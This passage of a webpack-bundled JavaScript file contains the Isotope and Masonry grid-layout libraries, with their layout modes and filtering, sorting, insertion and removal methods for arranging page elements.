          num = parseFloat(num);
          var mult = msUnits[unit] || 1;
          return num * mult;
        }

        // ----- fin ----- //

        // back in global
        Outlayer.Item = Item;
        return Outlayer;
      });

      /**
       * Isotope Item
      **/

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /*globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('isotope-layout/js/item', ['outlayer/outlayer'], factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(__webpack_require__(/*! outlayer */"./node_modules/outlayer/outlayer.js"));
        } else {
          // browser global
          window.Isotope = window.Isotope || {};
          window.Isotope.Item = factory(window.Outlayer);
        }
      })(window, function factory(Outlayer) {
        'use strict';

        // -------------------------- Item -------------------------- //

        // sub-class Outlayer Item
        function Item() {
          Outlayer.Item.apply(this, arguments);
        }
        var proto = Item.prototype = Object.create(Outlayer.Item.prototype);
        var _create = proto._create;
        proto._create = function () {
          // assign id, used for original-order sorting
          this.id = this.layout.itemGUID++;
          _create.call(this);
          this.sortData = {};
        };
        proto.updateSortData = function () {
          if (this.isIgnored) {
            return;
          }
          // default sorters
          this.sortData.id = this.id;
          // for backward compatibility
          this.sortData['original-order'] = this.id;
          this.sortData.random = Math.random();
          // go thru getSortData obj and apply the sorters
          var getSortData = this.layout.options.getSortData;
          var sorters = this.layout._sorters;
          for (var key in getSortData) {
            var sorter = sorters[key];
            this.sortData[key] = sorter(this.element, this);
          }
        };
        var _destroy = proto.destroy;
        proto.destroy = function () {
          // call super
          _destroy.apply(this, arguments);
          // reset display, #741
          this.css({
            display: ''
          });
        };
        return Item;
      });

      /**
       * Isotope LayoutMode
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /*globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('isotope-layout/js/layout-mode', ['get-size/get-size', 'outlayer/outlayer'], factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(__webpack_require__(/*! get-size */"./node_modules/get-size/get-size.js"), __webpack_require__(/*! outlayer */"./node_modules/outlayer/outlayer.js"));
        } else {
          // browser global
          window.Isotope = window.Isotope || {};
          window.Isotope.LayoutMode = factory(window.getSize, window.Outlayer);
        }
      })(window, function factory(getSize, Outlayer) {
        'use strict';

        // layout mode class
        function LayoutMode(isotope) {
          this.isotope = isotope;
          // link properties
          if (isotope) {
            this.options = isotope.options[this.namespace];
            this.element = isotope.element;
            this.items = isotope.filteredItems;
            this.size = isotope.size;
          }
        }
        var proto = LayoutMode.prototype;

        /**
         * some methods should just defer to default Outlayer method
         * and reference the Isotope instance as `this`
        **/
        var facadeMethods = ['_resetLayout', '_getItemLayoutPosition', '_manageStamp', '_getContainerSize', '_getElementOffset', 'needsResizeLayout', '_getOption'];
        facadeMethods.forEach(function (methodName) {
          proto[methodName] = function () {
            return Outlayer.prototype[methodName].apply(this.isotope, arguments);
          };
        });

        // -----  ----- //

        // for horizontal layout modes, check vertical size
        proto.needsVerticalResizeLayout = function () {
          // don't trigger if size did not change
          var size = getSize(this.isotope.element);
          // check that this.size and size are there
          // IE8 triggers resize on body size change, so they might not be
          var hasSizes = this.isotope.size && size;
          return hasSizes && size.innerHeight != this.isotope.size.innerHeight;
        };

        // ----- measurements ----- //

        proto._getMeasurement = function () {
          this.isotope._getMeasurement.apply(this, arguments);
        };
        proto.getColumnWidth = function () {
          this.getSegmentSize('column', 'Width');
        };
        proto.getRowHeight = function () {
          this.getSegmentSize('row', 'Height');
        };

        /**
         * get columnWidth or rowHeight
         * segment: 'column' or 'row'
         * size 'Width' or 'Height'
        **/
        proto.getSegmentSize = function (segment, size) {
          var segmentName = segment + size;
          var outerSize = 'outer' + size;
          // columnWidth / outerWidth // rowHeight / outerHeight
          this._getMeasurement(segmentName, outerSize);
          // got rowHeight or columnWidth, we can chill
          if (this[segmentName]) {
            return;
          }
          // fall back to item of first element
          var firstItemSize = this.getFirstItemSize();
          this[segmentName] = firstItemSize && firstItemSize[outerSize] ||
          // or size of container
          this.isotope.size['inner' + size];
        };
        proto.getFirstItemSize = function () {
          var firstItem = this.isotope.filteredItems[0];
          return firstItem && firstItem.element && getSize(firstItem.element);
        };

        // ----- methods that should reference isotope ----- //

        proto.layout = function () {
          this.isotope.layout.apply(this.isotope, arguments);
        };
        proto.getSize = function () {
          this.isotope.getSize();
          this.size = this.isotope.size;
        };

        // -------------------------- create -------------------------- //

        LayoutMode.modes = {};
        LayoutMode.create = function (namespace, options) {
          function Mode() {
            LayoutMode.apply(this, arguments);
          }
          Mode.prototype = Object.create(proto);
          Mode.prototype.constructor = Mode;

          // default options
          if (options) {
            Mode.options = options;
          }
          Mode.prototype.namespace = namespace;
          // register in Isotope
          LayoutMode.modes[namespace] = Mode;
          return Mode;
        };
        return LayoutMode;
      });

      /*!
       * Masonry v4.2.1
       * Cascading grid layout library
       * https://masonry.desandro.com
       * MIT License
       * by David DeSandro
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /*globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('masonry-layout/masonry', ['outlayer/outlayer', 'get-size/get-size'], factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(__webpack_require__(/*! outlayer */"./node_modules/outlayer/outlayer.js"), __webpack_require__(/*! get-size */"./node_modules/get-size/get-size.js"));
        } else {
          // browser global
          window.Masonry = factory(window.Outlayer, window.getSize);
        }
      })(window, function factory(Outlayer, getSize) {
        // -------------------------- masonryDefinition -------------------------- //

        // create an Outlayer layout class
        var Masonry = Outlayer.create('masonry');
        // isFitWidth -> fitWidth
        Masonry.compatOptions.fitWidth = 'isFitWidth';
        var proto = Masonry.prototype;
        proto._resetLayout = function () {
          this.getSize();
          this._getMeasurement('columnWidth', 'outerWidth');
          this._getMeasurement('gutter', 'outerWidth');
          this.measureColumns();

          // reset column Y
          this.colYs = [];
          for (var i = 0; i < this.cols; i++) {
            this.colYs.push(0);
          }
          this.maxY = 0;
          this.horizontalColIndex = 0;
        };
        proto.measureColumns = function () {
          this.getContainerWidth();
          // if columnWidth is 0, default to outerWidth of first item
          if (!this.columnWidth) {
            var firstItem = this.items[0];
            var firstItemElem = firstItem && firstItem.element;
            // columnWidth fall back to item of first element
            this.columnWidth = firstItemElem && getSize(firstItemElem).outerWidth ||
            // if first elem has no width, default to size of container
            this.containerWidth;
          }
          var columnWidth = this.columnWidth += this.gutter;

          // calculate columns
          var containerWidth = this.containerWidth + this.gutter;
          var cols = containerWidth / columnWidth;
          // fix rounding errors, typically with gutters
          var excess = columnWidth - containerWidth % columnWidth;
          // if overshoot is less than a pixel, round up, otherwise floor it
          var mathMethod = excess && excess < 1 ? 'round' : 'floor';
          cols = Math[mathMethod](cols);
          this.cols = Math.max(cols, 1);
        };
        proto.getContainerWidth = function () {
          // container is parent if fit width
          var isFitWidth = this._getOption('fitWidth');
          var container = isFitWidth ? this.element.parentNode : this.element;
          // check that this.size and size are there
          // IE8 triggers resize on body size change, so they might not be
          var size = getSize(container);
          this.containerWidth = size && size.innerWidth;
        };
        proto._getItemLayoutPosition = function (item) {
          item.getSize();
          // how many columns does this brick span
          var remainder = item.size.outerWidth % this.columnWidth;
          var mathMethod = remainder && remainder < 1 ? 'round' : 'ceil';
          // round if off by 1 pixel, otherwise use ceil
          var colSpan = Math[mathMethod](item.size.outerWidth / this.columnWidth);
          colSpan = Math.min(colSpan, this.cols);
          // use horizontal or top column position
          var colPosMethod = this.options.horizontalOrder ? '_getHorizontalColPosition' : '_getTopColPosition';
          var colPosition = this[colPosMethod](colSpan, item);
          // position the brick
          var position = {
            x: this.columnWidth * colPosition.col,
            y: colPosition.y
          };
          // apply setHeight to necessary columns
          var setHeight = colPosition.y + item.size.outerHeight;
          var setMax = colSpan + colPosition.col;
          for (var i = colPosition.col; i < setMax; i++) {
            this.colYs[i] = setHeight;
          }
          return position;
        };
        proto._getTopColPosition = function (colSpan) {
          var colGroup = this._getTopColGroup(colSpan);
          // get the minimum Y value from the columns
          var minimumY = Math.min.apply(Math, colGroup);
          return {
            col: colGroup.indexOf(minimumY),
            y: minimumY
          };
        };

        /**
         * @param {Number} colSpan - number of columns the element spans
         * @returns {Array} colGroup
         */
        proto._getTopColGroup = function (colSpan) {
          if (colSpan < 2) {
            // if brick spans only one column, use all the column Ys
            return this.colYs;
          }
          var colGroup = [];
          // how many different places could this brick fit horizontally
          var groupCount = this.cols + 1 - colSpan;
          // for each group potential horizontal position
          for (var i = 0; i < groupCount; i++) {
            colGroup[i] = this._getColGroupY(i, colSpan);
          }
          return colGroup;
        };
        proto._getColGroupY = function (col, colSpan) {
          if (colSpan < 2) {
            return this.colYs[col];
          }
          // make an array of colY values for that one group
          var groupColYs = this.colYs.slice(col, col + colSpan);
          // and get the max value of the array
          return Math.max.apply(Math, groupColYs);
        };

        // get column position based on horizontal index. #873
        proto._getHorizontalColPosition = function (colSpan, item) {
          var col = this.horizontalColIndex % this.cols;
          var isOver = colSpan > 1 && col + colSpan > this.cols;
          // shift to next row if item can't fit on current row
          col = isOver ? 0 : col;
          // don't let zero-size items take up space
          var hasSize = item.size.outerWidth && item.size.outerHeight;
          this.horizontalColIndex = hasSize ? col + colSpan : this.horizontalColIndex;
          return {
            col: col,
            y: this._getColGroupY(col, colSpan)
          };
        };
        proto._manageStamp = function (stamp) {
          var stampSize = getSize(stamp);
          var offset = this._getElementOffset(stamp);
          // get the columns that this stamp affects
          var isOriginLeft = this._getOption('originLeft');
          var firstX = isOriginLeft ? offset.left : offset.right;
          var lastX = firstX + stampSize.outerWidth;
          var firstCol = Math.floor(firstX / this.columnWidth);
          firstCol = Math.max(0, firstCol);
          var lastCol = Math.floor(lastX / this.columnWidth);
          // lastCol should not go over if multiple of columnWidth #425
          lastCol -= lastX % this.columnWidth ? 0 : 1;
          lastCol = Math.min(this.cols - 1, lastCol);
          // set colYs to bottom of the stamp

          var isOriginTop = this._getOption('originTop');
          var stampMaxY = (isOriginTop ? offset.top : offset.bottom) + stampSize.outerHeight;
          for (var i = firstCol; i <= lastCol; i++) {
            this.colYs[i] = Math.max(stampMaxY, this.colYs[i]);
          }
        };
        proto._getContainerSize = function () {
          this.maxY = Math.max.apply(Math, this.colYs);
          var size = {
            height: this.maxY
          };
          if (this._getOption('fitWidth')) {
            size.width = this._getContainerFitWidth();
          }
          return size;
        };
        proto._getContainerFitWidth = function () {
          var unusedCols = 0;
          // count unused columns
          var i = this.cols;
          while (--i) {
            if (this.colYs[i] !== 0) {
              break;
            }
            unusedCols++;
          }
          // fit container to columns that have been used
          return (this.cols - unusedCols) * this.columnWidth - this.gutter;
        };
        proto.needsResizeLayout = function () {
          var previousWidth = this.containerWidth;
          this.getContainerWidth();
          return previousWidth != this.containerWidth;
        };
        return Masonry;
      });

      /*!
       * Masonry layout mode
       * sub-classes Masonry
       * https://masonry.desandro.com
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /*globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('isotope-layout/js/layout-modes/masonry', [
          // '../layout-mode',
          'masonry-layout/masonry'], factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(
          // require('../layout-mode'),
          __webpack_require__(/*! masonry-layout */"./node_modules/masonry-layout/masonry.js"));
        } else {
          // browser global
          factory(window.Isotope.LayoutMode, window.Masonry);
        }
      })(window, function factory(LayoutMode, Masonry) {
        'use strict';

        // -------------------------- masonryDefinition -------------------------- //

        // create an Outlayer layout class
        var MasonryMode = LayoutMode.create('masonry');
        var proto = MasonryMode.prototype;
        var keepModeMethods = {
          _getElementOffset: true,
          layout: true,
          _getMeasurement: true
        };

        // inherit Masonry prototype
        for (var method in Masonry.prototype) {
          // do not inherit mode methods
          if (!keepModeMethods[method]) {
            proto[method] = Masonry.prototype[method];
          }
        }
        var measureColumns = proto.measureColumns;
        proto.measureColumns = function () {
          // set items, used if measuring first item
          this.items = this.isotope.filteredItems;
          measureColumns.call(this);
        };

        // point to mode options for fitWidth
        var _getOption = proto._getOption;
        proto._getOption = function (option) {
          if (option == 'fitWidth') {
            return this.options.isFitWidth !== undefined ? this.options.isFitWidth : this.options.fitWidth;
          }
          return _getOption.apply(this.isotope, arguments);
        };
        return MasonryMode;
      });

      /**
       * fitRows layout mode
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /*globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('isotope-layout/js/layout-modes/fit-rows', [
            // '../layout-mode'
          ], factory);
        } else if ((typeof exports === "undefined" ? "undefined" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(exports)) == 'object') {
          // CommonJS
          module.exports = factory(
            // require('../layout-mode')
          );
        } else {
          // browser global
          factory(window.Isotope.LayoutMode);
        }
      })(window, function factory(LayoutMode) {
        'use strict';

        var FitRows = LayoutMode.create('fitRows');
        var proto = FitRows.prototype;
        proto._resetLayout = function () {
          this.x = 0;
          this.y = 0;
          this.maxY = 0;
          this._getMeasurement('gutter', 'outerWidth');
        };
        proto._getItemLayoutPosition = function (item) {
          item.getSize();
          var itemWidth = item.size.outerWidth + this.gutter;
          // if this element cannot fit in the current row
          var containerWidth = this.isotope.size.innerWidth + this.gutter;
          if (this.x !== 0 && itemWidth + this.x > containerWidth) {
            this.x = 0;
            this.y = this.maxY;
          }
          var position = {
            x: this.x,
            y: this.y
          };
          this.maxY = Math.max(this.maxY, this.y + item.size.outerHeight);
          this.x += itemWidth;
          return position;
        };
        proto._getContainerSize = function () {
          return {
            height: this.maxY
          };
        };
        return FitRows;
      });

      /**
       * vertical layout mode
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /*globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('isotope-layout/js/layout-modes/vertical', [
            // '../layout-mode'
          ], factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(
            // require('../layout-mode')
          );
        } else {
          // browser global
          factory(window.Isotope.LayoutMode);
        }
      })(window, function factory(LayoutMode) {
        'use strict';

        var Vertical = LayoutMode.create('vertical', {
          horizontalAlignment: 0
        });
        var proto = Vertical.prototype;
        proto._resetLayout = function () {
          this.y = 0;
        };
        proto._getItemLayoutPosition = function (item) {
          item.getSize();
          var x = (this.isotope.size.innerWidth - item.size.outerWidth) * this.options.horizontalAlignment;
          var y = this.y;
          this.y += item.size.outerHeight;
          return {
            x: x,
            y: y
          };
        };
        proto._getContainerSize = function () {
          return {
            height: this.y
          };
        };
        return Vertical;
      });

      /*!
       * Isotope v3.0.6
       *
       * Licensed GPLv3 for open source use
       * or Isotope Commercial License for commercial use
       *
       * https://isotope.metafizzy.co
       * Copyright 2010-2018 Metafizzy
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /*globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define(['outlayer/outlayer', 'get-size/get-size', 'desandro-matches-selector/matches-selector', 'fizzy-ui-utils/utils', 'isotope-layout/js/item', 'isotope-layout/js/layout-mode',
          // include default layout modes
          'isotope-layout/js/layout-modes/masonry', 'isotope-layout/js/layout-modes/fit-rows', 'isotope-layout/js/layout-modes/vertical'], function (Outlayer, getSize, matchesSelector, utils, Item, LayoutMode) {
            return factory(window, Outlayer, getSize, matchesSelector, utils, Item, LayoutMode);
          });
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(window, __webpack_require__(/*! outlayer */"./node_modules/outlayer/outlayer.js"), __webpack_require__(/*! get-size */"./node_modules/get-size/get-size.js"), __webpack_require__(/*! desandro-matches-selector */"./node_modules/desandro-matches-selector/matches-selector.js"), __webpack_require__(/*! fizzy-ui-utils */"./node_modules/fizzy-ui-utils/utils.js"), __webpack_require__(/*! isotope-layout/js/item */"./node_modules/isotope-layout/js/item.js"), __webpack_require__(/*! isotope-layout/js/layout-mode */"./node_modules/isotope-layout/js/layout-mode.js"),
          // include default layout modes
          __webpack_require__(/*! isotope-layout/js/layout-modes/masonry */"./node_modules/isotope-layout/js/layout-modes/masonry.js"), __webpack_require__(/*! isotope-layout/js/layout-modes/fit-rows */"./node_modules/isotope-layout/js/layout-modes/fit-rows.js"), __webpack_require__(/*! isotope-layout/js/layout-modes/vertical */"./node_modules/isotope-layout/js/layout-modes/vertical.js"));
        } else {
          // browser global
          window.Isotope = factory(window, window.Outlayer, window.getSize, window.matchesSelector, window.fizzyUIUtils, window.Isotope.Item, window.Isotope.LayoutMode);
        }
      })(window, function factory(window, Outlayer, getSize, matchesSelector, utils, Item, LayoutMode) {
        // -------------------------- vars -------------------------- //

        var jQuery = window.jQuery;

        // -------------------------- helpers -------------------------- //

        var trim = String.prototype.trim ? function (str) {
          return str.trim();
        } : function (str) {
          return str.replace(/^\s+|\s+$/g, '');
        };

        // -------------------------- isotopeDefinition -------------------------- //

        // create an Outlayer layout class
        var Isotope = Outlayer.create('isotope', {
          layoutMode: 'masonry',
          isJQueryFiltering: true,
          sortAscending: true
        });
        Isotope.Item = Item;
        Isotope.LayoutMode = LayoutMode;
        var proto = Isotope.prototype;
        proto._create = function () {
          this.itemGUID = 0;
          // functions that sort items
          this._sorters = {};
          this._getSorters();
          // call super
          Outlayer.prototype._create.call(this);

          // create layout modes
          this.modes = {};
          // start filteredItems with all items
          this.filteredItems = this.items;
          // keep of track of sortBys
          this.sortHistory = ['original-order'];
          // create from registered layout modes
          for (var name in LayoutMode.modes) {
            this._initLayoutMode(name);
          }
        };
        proto.reloadItems = function () {
          // reset item ID counter
          this.itemGUID = 0;
          // call super
          Outlayer.prototype.reloadItems.call(this);
        };
        proto._itemize = function () {
          var items = Outlayer.prototype._itemize.apply(this, arguments);
          // assign ID for original-order
          for (var i = 0; i < items.length; i++) {
            var item = items[i];
            item.id = this.itemGUID++;
          }
          this._updateItemsSortData(items);
          return items;
        };

        // -------------------------- layout -------------------------- //

        proto._initLayoutMode = function (name) {
          var Mode = LayoutMode.modes[name];
          // set mode options
          // HACK extend initial options, back-fill in default options
          var initialOpts = this.options[name] || {};
          this.options[name] = Mode.options ? utils.extend(Mode.options, initialOpts) : initialOpts;
          // init layout mode instance
          this.modes[name] = new Mode(this);
        };
        proto.layout = function () {
          // if first time doing layout, do all magic
          if (!this._isLayoutInited && this._getOption('initLayout')) {
            this.arrange();
            return;
          }
          this._layout();
        };

        // private method to be used in layout() & magic()
        proto._layout = function () {
          // don't animate first layout
          var isInstant = this._getIsInstant();
          // layout flow
          this._resetLayout();
          this._manageStamps();
          this.layoutItems(this.filteredItems, isInstant);

          // flag for initalized
          this._isLayoutInited = true;
        };

        // filter + sort + layout
        proto.arrange = function (opts) {
          // set any options pass
          this.option(opts);
          this._getIsInstant();
          // filter, sort, and layout

          // filter
          var filtered = this._filter(this.items);
          this.filteredItems = filtered.matches;
          this._bindArrangeComplete();
          if (this._isInstant) {
            this._noTransition(this._hideReveal, [filtered]);
          } else {
            this._hideReveal(filtered);
          }
          this._sort();
          this._layout();
        };
        // alias to _init for main plugin method
        proto._init = proto.arrange;
        proto._hideReveal = function (filtered) {
          this.reveal(filtered.needReveal);
          this.hide(filtered.needHide);
        };

        // HACK
        // Don't animate/transition first layout
        // Or don't animate/transition other layouts
        proto._getIsInstant = function () {
          var isLayoutInstant = this._getOption('layoutInstant');
          var isInstant = isLayoutInstant !== undefined ? isLayoutInstant : !this._isLayoutInited;
          this._isInstant = isInstant;
          return isInstant;
        };

        // listen for layoutComplete, hideComplete and revealComplete
        // to trigger arrangeComplete
        proto._bindArrangeComplete = function () {
          // listen for 3 events to trigger arrangeComplete
          var isLayoutComplete, isHideComplete, isRevealComplete;
          var _this = this;
          function arrangeParallelCallback() {
            if (isLayoutComplete && isHideComplete && isRevealComplete) {
              _this.dispatchEvent('arrangeComplete', null, [_this.filteredItems]);
            }
          }
          this.once('layoutComplete', function () {
            isLayoutComplete = true;
            arrangeParallelCallback();
          });
          this.once('hideComplete', function () {
            isHideComplete = true;
            arrangeParallelCallback();
          });
          this.once('revealComplete', function () {
            isRevealComplete = true;
            arrangeParallelCallback();
          });
        };

        // -------------------------- filter -------------------------- //

        proto._filter = function (items) {
          var filter = this.options.filter;
          filter = filter || '*';
          var matches = [];
          var hiddenMatched = [];
          var visibleUnmatched = [];
          var test = this._getFilterTest(filter);

          // test each item
          for (var i = 0; i < items.length; i++) {
            var item = items[i];
            if (item.isIgnored) {
              continue;
            }
            // add item to either matched or unmatched group
            var isMatched = test(item);
            // item.isFilterMatched = isMatched;
            // add to matches if its a match
            if (isMatched) {
              matches.push(item);
            }
            // add to additional group if item needs to be hidden or revealed
            if (isMatched && item.isHidden) {
              hiddenMatched.push(item);
            } else if (!isMatched && !item.isHidden) {
              visibleUnmatched.push(item);
            }
          }

          // return collections of items to be manipulated
          return {
            matches: matches,
            needReveal: hiddenMatched,
            needHide: visibleUnmatched
          };
        };

        // get a jQuery, function, or a matchesSelector test given the filter
        proto._getFilterTest = function (filter) {
          if (jQuery && this.options.isJQueryFiltering) {
            // use jQuery
            return function (item) {
              return jQuery(item.element).is(filter);
            };
          }
          if (typeof filter == 'function') {
            // use filter as function
            return function (item) {
              return filter(item.element);
            };
          }
          // default, use filter as selector string
          return function (item) {
            return matchesSelector(item.element, filter);
          };
        };

        // -------------------------- sorting -------------------------- //

        /**
         * @params {Array} elems
         * @public
         */
        proto.updateSortData = function (elems) {
          // get items
          var items;
          if (elems) {
            elems = utils.makeArray(elems);
            items = this.getItems(elems);
          } else {
            // update all items if no elems provided
            items = this.items;
          }
          this._getSorters();
          this._updateItemsSortData(items);
        };
        proto._getSorters = function () {
          var getSortData = this.options.getSortData;
          for (var key in getSortData) {
            var sorter = getSortData[key];
            this._sorters[key] = mungeSorter(sorter);
          }
        };

        /**
         * @params {Array} items - of Isotope.Items
         * @private
         */
        proto._updateItemsSortData = function (items) {
          // do not update if no items
          var len = items && items.length;
          for (var i = 0; len && i < len; i++) {
            var item = items[i];
            item.updateSortData();
          }
        };

        // ----- munge sorter ----- //

        // encapsulate this, as we just need mungeSorter
        // other functions in here are just for munging
        var mungeSorter = function () {
          // add a magic layer to sorters for convienent shorthands
          // `.foo-bar` will use the text of .foo-bar querySelector
          // `[foo-bar]` will use attribute
          // you can also add parser
          // `.foo-bar parseInt` will parse that as a number
          function mungeSorter(sorter) {
            // if not a string, return function or whatever it is
            if (typeof sorter != 'string') {
              return sorter;
            }
            // parse the sorter string
            var args = trim(sorter).split(' ');
            var query = args[0];
            // check if query looks like [an-attribute]
            var attrMatch = query.match(/^\[(.+)\]$/);
            var attr = attrMatch && attrMatch[1];
            var getValue = getValueGetter(attr, query);
            // use second argument as a parser
            var parser = Isotope.sortDataParsers[args[1]];
            // parse the value, if there was a parser
            sorter = parser ? function (elem) {
              return elem && parser(getValue(elem));
            } :
            // otherwise just return value
            function (elem) {
              return elem && getValue(elem);
            };
            return sorter;
          }

          // get an attribute getter, or get text of the querySelector
          function getValueGetter(attr, query) {
            // if query looks like [foo-bar], get attribute
            if (attr) {
              return function getAttribute(elem) {
                return elem.getAttribute(attr);
              };
            }

            // otherwise, assume its a querySelector, and get its text
            return function getChildText(elem) {
              var child = elem.querySelector(query);
              return child && child.textContent;
            };
          }
          return mungeSorter;
        }();

        // parsers used in getSortData shortcut strings
        Isotope.sortDataParsers = {
          'parseInt': function (_parseInt) {
            function parseInt(_x) {
              return _parseInt.apply(this, arguments);
            }
            parseInt.toString = function () {
              return _parseInt.toString();
            };
            return parseInt;
          }(function (val) {
            return parseInt(val, 10);
          }),
          'parseFloat': function (_parseFloat) {
            function parseFloat(_x2) {
              return _parseFloat.apply(this, arguments);
            }
            parseFloat.toString = function () {
              return _parseFloat.toString();
            };
            return parseFloat;
          }(function (val) {
            return parseFloat(val);
          })
        };

        // ----- sort method ----- //

        // sort filteredItem order
        proto._sort = function () {
          if (!this.options.sortBy) {
            return;
          }
          // keep track of sortBy History
          var sortBys = utils.makeArray(this.options.sortBy);
          if (!this._getIsSameSortBy(sortBys)) {
            // concat all sortBy and sortHistory, add to front, oldest goes in last
            this.sortHistory = sortBys.concat(this.sortHistory);
          }
          // sort magic
          var itemSorter = getItemSorter(this.sortHistory, this.options.sortAscending);
          this.filteredItems.sort(itemSorter);
        };

        // check if sortBys is same as start of sortHistory
        proto._getIsSameSortBy = function (sortBys) {
          for (var i = 0; i < sortBys.length; i++) {
            if (sortBys[i] != this.sortHistory[i]) {
              return false;
            }
          }
          return true;
        };

        // returns a function used for sorting
        function getItemSorter(sortBys, sortAsc) {
          return function sorter(itemA, itemB) {
            // cycle through all sortKeys
            for (var i = 0; i < sortBys.length; i++) {
              var sortBy = sortBys[i];
              var a = itemA.sortData[sortBy];
              var b = itemB.sortData[sortBy];
              if (a > b || a < b) {
                // if sortAsc is an object, use the value given the sortBy key
                var isAscending = sortAsc[sortBy] !== undefined ? sortAsc[sortBy] : sortAsc;
                var direction = isAscending ? 1 : -1;
                return (a > b ? 1 : -1) * direction;
              }
            }
            return 0;
          };
        }

        // -------------------------- methods -------------------------- //

        // get layout mode
        proto._mode = function () {
          var layoutMode = this.options.layoutMode;
          var mode = this.modes[layoutMode];
          if (!mode) {
            // TODO console.error
            throw new Error('No layout mode: ' + layoutMode);
          }
          // HACK sync mode's options
          // any options set after init for layout mode need to be synced
          mode.options = this.options[layoutMode];
          return mode;
        };
        proto._resetLayout = function () {
          // trigger original reset layout
          Outlayer.prototype._resetLayout.call(this);
          this._mode()._resetLayout();
        };
        proto._getItemLayoutPosition = function (item) {
          return this._mode()._getItemLayoutPosition(item);
        };
        proto._manageStamp = function (stamp) {
          this._mode()._manageStamp(stamp);
        };
        proto._getContainerSize = function () {
          return this._mode()._getContainerSize();
        };
        proto.needsResizeLayout = function () {
          return this._mode().needsResizeLayout();
        };

        // -------------------------- adding & removing -------------------------- //

        // HEADS UP overwrites default Outlayer appended
        proto.appended = function (elems) {
          var items = this.addItems(elems);
          if (!items.length) {
            return;
          }
          // filter, layout, reveal new items
          var filteredItems = this._filterRevealAdded(items);
          // add to filteredItems
          this.filteredItems = this.filteredItems.concat(filteredItems);
        };

        // HEADS UP overwrites default Outlayer prepended
        proto.prepended = function (elems) {
          var items = this._itemize(elems);
          if (!items.length) {
            return;
          }
          // start new layout
          this._resetLayout();
          this._manageStamps();
          // filter, layout, reveal new items
          var filteredItems = this._filterRevealAdded(items);
          // layout previous items
          this.layoutItems(this.filteredItems);
          // add to items and filteredItems
          this.filteredItems = filteredItems.concat(this.filteredItems);
          this.items = items.concat(this.items);
        };
        proto._filterRevealAdded = function (items) {
          var filtered = this._filter(items);
          this.hide(filtered.needHide);
          // reveal all new items
          this.reveal(filtered.matches);
          // layout new items, no transition
          this.layoutItems(filtered.matches, true);
          return filtered.matches;
        };

        /**
         * Filter, sort, and layout newly-appended item elements
         * @param {Array or NodeList or Element} elems
         */
        proto.insert = function (elems) {
          var items = this.addItems(elems);
          if (!items.length) {
            return;
          }
          // append item elements
          var i, item;
          var len = items.length;
          for (i = 0; i < len; i++) {
            item = items[i];
            this.element.appendChild(item.element);
          }
          // filter new stuff
          var filteredInsertItems = this._filter(items).matches;
          // set flag
          for (i = 0; i < len; i++) {
            items[i].isLayoutInstant = true;
          }
          this.arrange();
          // reset flag
          for (i = 0; i < len; i++) {
            delete items[i].isLayoutInstant;
          }
          this.reveal(filteredInsertItems);
        };
        var _remove = proto.remove;
        proto.remove = function (elems) {
          elems = utils.makeArray(elems);
          var removeItems = this.getItems(elems);
          // do regular thing
          _remove.call(this, elems);
          // bail if no items to remove
          var len = removeItems && removeItems.length;
          // remove elems from filteredItems
          for (var i = 0; len && i < len; i++) {
            var item = removeItems[i];
            // remove item from collection
            utils.removeFrom(this.filteredItems, item);
          }
        };
        proto.shuffle = function () {
          // update random sortData
          for (var i = 0; i < this.items.length; i++) {
            var item = this.items[i];
            item.sortData.random = Math.random();
          }
          this.options.sortBy = 'random';
          this._sort();
          this._layout();
        };

        /**
         * trigger fn without transition
         * kind of hacky to have this in the first place
         * @param {Function} fn
         * @param {Array} args
         * @returns ret
         * @private
         */
        proto._noTransition = function (fn, args) {
          // save transitionDuration before disabling
          var transitionDuration = this.options.transitionDuration;
          // disable transition
          this.options.transitionDuration = 0;
          // do it
          var returnValue = fn.apply(this, args);
          // re-enable transition for reveal
          this.options.transitionDuration = transitionDuration;
          return returnValue;
        };

        // ----- helper methods ----- //

        /**
         * getter method for getting filtered item elements
         * @returns {Array} elems - collection of item elements
         */
        proto.getFilteredItemElements = function () {
          return this.filteredItems.map(function (item) {
            return item.element;
          });
        };

        // -----  ----- //

        return Isotope;
      });
